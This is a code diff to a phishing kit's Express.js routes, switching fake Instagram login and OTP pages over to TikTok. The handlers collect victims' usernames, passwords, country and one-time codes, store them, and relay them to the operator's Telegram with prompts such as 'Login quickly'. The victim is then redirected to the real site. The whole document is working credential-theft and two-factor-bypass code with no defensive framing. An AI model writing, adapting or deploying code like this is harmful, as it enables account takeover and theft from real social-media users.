@@ -5,45 +5,45 @@ const Credential = require("../../models/CredentialModel");
 const bot = require("../../telegram");
 
 
-router.get("/inst/:linkId", async (req, res) => {
+router.get("/tikto/:linkId", async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
-        if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
+        if (Date.now() > link.expiry) {
             return res.redirect("/notfound");
         }
-        return res.render("socials/instagram/instagram", { req, linkId, layout: false });
+        if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
+            return res.redirect("/notfound");
+        }
+        return res.render("socials/tiktok/tiktok", { req, linkId, layout: false });
     } catch (err) {
         console.log(err)
     }
 });
 
-router.get("/inst/otp/:linkId", async (req, res) => {
+router.get("/tikto/otp/:linkId", async (req, res) => {
     try {
         const { linkId } = req.params;
         const link = await Links.findOne({ _id: linkId });
         if (!link) {
             return res.redirect("/notfound");
         }
-        // if (Date.now() > link.expiry) {
-        //     return res.redirect("/notfound");
-        // }
-        if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
+        if (Date.now() > link.expiry) {
             return res.redirect("/notfound");
         }
-        return res.render("socials/instagram/instaOTP", { req, linkId, layout: false });
+        if (linkId.length !== 24 || !link || link.linkType !== 'TIKTOK') {
+            return res.redirect("/notfound");
+        }
+        return res.render("socials/tiktok/otp", { req, linkId, layout: false });
     } catch (err) {
         console.log(err);
     }
 });
 
-router.post("/inst/:linkId", async (req, res) => {
+router.post("/tikto/:linkId", async (req, res) => {
     try {
         const { username, password, country } = req.body;
         const { linkId } = req.params;
@@ -58,7 +58,7 @@ router.post("/inst/:linkId", async (req, res) => {
                 user: link.user,
                 link: linkId,
                 linkName: link.name,
-                linkType: "Instagram",
+                linkType: "TIKTOK",
                 country,
                 fields: {
                     username,
@@ -68,19 +68,20 @@ router.post("/inst/:linkId", async (req, res) => {
             await newCredential.save();
             await bot.sendMessage(user.telegramID, `
                 😈 New Entry 😈
-INSTAGRAM
+SOCIAL MEDIA: TIKTOK
 LOCATION: ${country}
-
-username: ${username}
-pasword: ${password}
+USERNAME: ${username}
+PASSWORD: ${password}
 
 OTP: ${link.otpEnabled ? "Wait for OTP after logging in" : "NOT AN OTP LINK"}
 
-Login now: https://www.instagram.com
+Login quickly 🏃🏾🏃🏾🏃🏾
+
+Login now: https://www.tiktok.com or use mobile app
                                                 `)
                 .catch(err => console.log("Telegram error"));
             if (link.otpEnabled) {
-                return res.redirect("/inst/otp/" + link.id);
+                return res.redirect("/tikto/otp/" + link.id);
             } else {
                 return res.redirect("/congrats");
             }
@@ -93,7 +94,7 @@ Login now: https://www.instagram.com
     }
 });
 
-router.post("/inst/otp/:linkId", async (req, res) => {
+router.post("/tikto/otp/:linkId", async (req, res) => {
     try {
         const { linkId, code } = req.body;
         if (linkId.length !== 24) {
@@ -105,14 +106,15 @@ router.post("/inst/otp/:linkId", async (req, res) => {
         if (link) {
             await bot.sendMessage(user.telegramID, `
 😈 NEW ENTRY 😈
-INSTAGRAM
+
+SOCIAL MEDIA: TIKTOK
 
 OTP: ${code}
 
                 `)
                 .catch(err => console.log("Telegram error"));
 
-            return res.redirect("https://instagram.com")
+            return res.redirect("https://tiktok.com")
         }
         else {
             return res.redirect("/notfound");
